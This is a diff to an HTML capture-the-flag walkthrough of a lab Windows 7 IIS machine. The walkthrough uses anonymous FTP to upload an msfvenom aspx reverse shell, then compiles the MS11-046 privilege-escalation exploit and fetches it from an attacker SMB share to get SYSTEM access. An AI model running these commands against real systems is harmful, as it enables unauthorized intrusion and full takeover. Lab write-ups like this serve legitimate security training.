@@ -22,70 +22,70 @@
         You should perform other scans also like full port scan and Udp scan using commands: <br>
         nmap -T4 -sV -sC -p- -A 10.10.10.5 -v10 (Full Port) <br>
         nmap -T5 -sv -sc -sU -A 10.10.10.5 -v10 (UDP Scan)</h2>
-        <img src="images/scan start 1.png" alt="Responsive Image">
+        <img src="scan start 1.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Since we got a lead by first scan so moving forward , from our scan we got to know that there is Ftp’s vulnerability which allow us to login using anonymous username and no password. Let’s also check if there is any website hosted on this ip or not as we have also seen http port open .</h2>
-        <img src="images/anonymous allowed ftp 2.png" alt="Responsive Image">
-        <img src="images/website 3.png" alt="Responsive Image">
+        <img src="anonymous allowed ftp 2.png" alt="Responsive Image">
+        <img src="website 3.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Yes there is a website hosted and we also entered in machine using Ftp. Now let’s check the website’s source code for any secrets or hints and also in ftp if we can upload/download anything from machine using anonymous username. </h2>
-        <img src="images/can download 5.png" alt="Responsive Image">
+        <img src="can download 5.png" alt="Responsive Image">
       </article>
       <article>
         <h2>After listing the files using ls command we can see there is a file names “welcome.png” which is also present in website’s source code this means that web server And ftp server are both using the same directory which means we can upload a shell using ftp and execute it using web server .</h2>
-        <img src="images/Source code 6.png" alt="Responsive Image">
-        <img src="images/can upload 4.png" alt="Responsive Image">
+        <img src="Source code 6.png" alt="Responsive Image">
+        <img src="can upload 4.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Yes we have access to upload and download now to confirm what we discussed earlier about same directory , let’s try to access the uploaded item using web server. And as we can see we are able to access it .</h2>
-        <img src="images/can access using web 7.png" alt="Responsive Image">
+        <img src="can access using web 7.png" alt="Responsive Image">
       </article>
       <article>
         <h2>This means we can run our reverse shell , so let’s create our reverse shell but in which format should we create it . By little searching we got to know that IIS server running  uses asp language so we have to create in .asp/.aspx format.</h2>
         <h2>We are avoiding msfconsole framework in this walkthrough so we’ll create or search for stageless payloads so we are using this command to create it :  msfvenom -p windows/shell_reverse_tcp -f aspx LHOST LPORT > shell.aspx <br>
         And upload it using Ftp</h2>
-        <img src="images/shell uploaded 8.png" alt="Responsive Image">
+        <img src="shell uploaded 8.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Now lets start the listener on attacking machine and then run our shell using web server i.e on browser open “http://10.10.10.5/shell.aspx “</h2>
-        <img src="images/Shell access 9.png" alt="Responsive Image">
+        <img src="Shell access 9.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Congratulations we have entered in machine’s shell using whoami command we get to know that we are web user only and we don’t have access to any Users folders</h2>
-        <img src="images/Folder access denied 10.png" alt="Responsive Image">
+        <img src="Folder access denied 10.png" alt="Responsive Image">
       </article>
       <article>
         <h2>So now we have to perform Privilege escalation to get the root access. <br>
         So lets first enumerate and check system info using command “systeminfo” </h2>
-        <img src="images/sysinfo 11.png" alt="Responsive Image">
+        <img src="sysinfo 11.png" alt="Responsive Image">
       </article>
       <article>
         <h2>From here we got to know that the machine’s OS is Windows 7 Enterprise and version is 6.1.7600 Build 7600. Now we can search for its exploit if available <br>
         And to our luck by searching we got one privilege escalation vulnerability on exploit-db that is 40564.c having code MS11-046 <br>
         You can also find it using searchsploit and then mirror it to your device .</h2>
-        <img src="images/exploit search 12.png" alt="Responsive Image">
+        <img src="exploit search 12.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Since this exploit is in c language you must have gcc or c compiler to compile it and make it in executable format. <br> 
         Use command : i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32</h2>
-        <img src="images/gcc.png" alt="Responsive Image">
+        <img src="gcc.png" alt="Responsive Image">
       </article>
       <article>
         <h2>Now we have our executable so lets transfer it to our machine whose web access we got <br>
         We can transfer it using many techniques like python server or smb or ftp but using some techniques we got to know we can’t use curl or wget command .</h2>
-        <img src="images/curl wget not running 13.png" alt="Responsive Image">
+        <img src="curl wget not running 13.png" alt="Responsive Image">
       </article>
       <article>
         <h2>After some hit and try we got a solution , we can transfer it using impackets (smb-server) and download it using copy command</h2> 
         <h2>Lets start smb server on our attacking machine using command : 
         Impacket-smbserver share $(pwd) -smb2support</h2>
-        <img src="images/smbserver start 14.png" alt="Responsive Image">
+        <img src="smbserver start 14.png" alt="Responsive Image">
       </article>
       <article>
         <h2>And copy it in machine using command : copy \\10.10.16.12\share\MS11-046.exe </h2>
-        <img src="images/root access 15.png" alt="Responsive Image">
+        <img src="root access 15.png" alt="Responsive Image">
         <h2>Yaayyy its copied now lets run it <br> 
             And Boom we got out root access now we can move anywhere and find our flags.</h2>
       </article>
